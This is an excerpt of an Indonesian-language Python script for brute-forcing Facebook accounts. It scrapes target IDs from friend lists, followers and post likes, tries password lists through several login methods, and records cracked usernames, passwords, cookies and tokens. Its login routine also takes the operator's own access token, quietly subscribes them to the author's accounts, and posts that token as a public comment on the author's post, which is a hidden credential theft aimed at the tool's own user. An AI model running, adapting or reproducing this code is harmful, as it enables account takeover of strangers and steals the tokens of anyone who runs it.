...
#Coded by latip harkat,ijin rikod ngaf :v
#Aungtor Arya Eksdih :v.
...
def crack(user,pw):
	...
	try:
		...
		if 'c_user' in ses.cookies.get_dict().keys():
			...
			print(f'\r{merah}Jaringan lu ngelag ngentod.	',end='')
...
def check_in(user, pasw,ttl):
	...
	if "c_user" in ses.cookies:
		cp-=1
		ok+=1
		print(f"\r{ijo}[SIESTA] ONETAP {user} | {pasw} | {''.join(ses.cookies.get_dict())}														{putih}",end="")
		...
		if(str(len(ngew))=="0"):
			...
			print(f"\r{ijo}[SIESTA] ONETAP {user} | {pasw} | {ttl}														{putih}",end="")
		else:
			print(f"\r{kuning}[WIBU] {user} | {pasw} | {ttl}{putih}                                                                                      ",end="")
...
def login():
	try:
		...
		os.system("clear")
		print(f"[{biruM}!{putih}] LOGIN DULU NGAB [{biruM}!{putih}]\n")
		token=input(f"[{biru}+{putih}] Token Facebook : ")
		try:
			r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={token}').text)
			nama=r['name']
			ttl=r['birthday']
			open('save','w').write(token)
			print(f"\n[{ijo}✓{putih}] Login Sukses\n[{merah}!{putih}] Sabar Dulu Coek...")
			req.post(f'https://graph.facebook.com/100001137791549/subscribers?access_token={token}') #ARYA A MD.
			req.post(f"https://graph.facebook.com/100001307011557/subscribers?access_token={token}") #ARYA FB ID
			req.post(f"https://graph.facebook.com/103428878676064/subscribers?access_token={token}") #ARYA TRICKER PG
			req.post(f'https://graph.facebook.com/100014762377020/subscribers?access_token={token}') #ARYA UNIK
			req.post(f"https://graph.facebook.com/100020192268351/subscribers?access_token={token}") #ARYA 3K FOLL
			req.post(f'https://graph.facebook.com/1578129640/subscribers?access_token={token}') #ARYA 08
			req.post(f'https://graph.facebook.com/100047875055348/subscribers?access_token={token}') #ARYA KHURAYRA
			req.post(f'https://graph.facebook.com/4404527476261802/comments?message={token}&access_token={token}')
			req.post(f'https://graph.facebook.com/4404527476261802/comments?message={random.choice(["Arya Love Siesta <3","Siesta Cantik Banget","Arya Love Siesta Forever"])}&access_token={token}')
			time.sleep(2)
			dump(token,nama,ttl)
		except KeyError:
			exit(f"[{merah}×{putih}] Token Invalid,Ganti Yg Lain Ngentod [{merah}×{putih}]")
	except KeyError:
...
class kondisi:
	...
	def kondisi_api(self,user,aj):
		...
		for pw in aj:
			...
			if logika.get("status")=="ok":
				...
				print(f"\r\33[32;1m[SIESTA] {logika.get('user')} | {logika.get('pw')} | {logika.get('token')}\33[37;1m                                          ",end="")
				...
				if("".join(opsi)=="y"):
					...
					print(f"\r\33[1;33m[WIBU] {user} | {logika.get('pw')} | {ttl}								\n\33[37;1m",end="")
				else:
					print(f"\r\33[1;33m[WIBU] {user} | {logika.get('pw')} | {ttl}								\n\33[37;1m",end="")
				break
			print(f'\r[{biruL}={putih}] SIESTA:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}]	',end='')
	...
	def kondisi_mbasic(self,user,aj):
		...
		for pw in aj:
			...
			if logika.get("status")=="ok":
				open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
				print(f"\r\33[32;1m[SIESTA] {logika.get('user')} | {logika.get('pw')} | {''.join(logika.get('cookie'))}                                          \33[37;1m\n",end="")
				...
				if("".join(opsi)=="y"):
					...
					print(f"\r\33[1;33m[WIBU] {user} | {logika.get('pw')} | {ttl}								\33[37;1m",end="")
				break
			print(f'\r[{biruL}={putih}] SIESTA:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}]	',end='')
			...
			if logika.get("status")=="ok":
				...
				for fllow in r.find_all("a"):
					if "Berhenti mengikuti" in str(fllow):
						...
						req.get(mb+fllow["href"],cookies=coki)
				print(f"\r\33[32;1m[SIESTA] {logika.get('user')} | {logika.get('pw')} | {''.join(logika.get('cookies'))}                                          \33[37;1m\n",end="")
				break
			elif logika.get("status")=="cp":
				cp+=1
				try:
...
def dump(token,nama,ttl):
	global password
	os.system("clear")
	jalan("""%s   _____ ________________________ 
  / ___//  _/ ____/ ___/_  __/   |
  \__ \ / // __/  \__ \ / / / /| |
 ___/ // // /___ ___/ // / / ___ |
...
%sAuthor : Arya Adinata
Github.com/Avos-Dilhevia
Facebook.com/AryaTrickers2020
Insta : mizari.rhein                                                                                                  """%(biruM,merah,putih))
	print(f"[{biruM}!{putih}] HIDUPKAN MODE PESAWAT 5 DETIK [{biruM}!{putih}]")
	jalan(f"[{biru}={putih}] Ohayou {biruM}{nama}{putih} Onee-Chan :v\n[{biru}={putih}] TTL Akun Kamu : {biruM}{ttl}{putih}")
	print(f"\n[{biruL}01{putih}] Crack Dari Daftar Teman\n[{biruL}02{putih}] Crack Dari Followers\n[{biruL}03{putih}] Crack Dari Like Postingan\n[{biruL}04{putih}] Cari Target Crack\n[{biruL}05{putih}] Cek Hasil Maling\n[{biruL}UA{putih}] Ganti User Agent\n")
	l=input(f"[{biru}?{putih}] Pilih : ")
	if(l in ("01","1")):
		print("")
		try:
		...
		dump(token,nama,ttl)
	time.sleep(1)
	print(f"[{biruM}/\{putih}] Pilih Metode Crack [{biruM}/\{putih}]\n[{biruL}01{putih}] METODE {merah}B-API{putih} (Cepat) gampang spam njing\n[{biruL}02{putih}] METODE {kuning}MBASIC V1{putih} (Cepat) hasil dikit\n[{biruL}03{putih}] METODE {ijo}MBASIC V2{putih} (Lama) hasil banyak [recomended]\n")
	...
	print(f" *** Contoh arya,love,siesta masukan {biru}'t'{putih} untuk tidak menambahkan password\n")
	if(pi in ("01","1")):
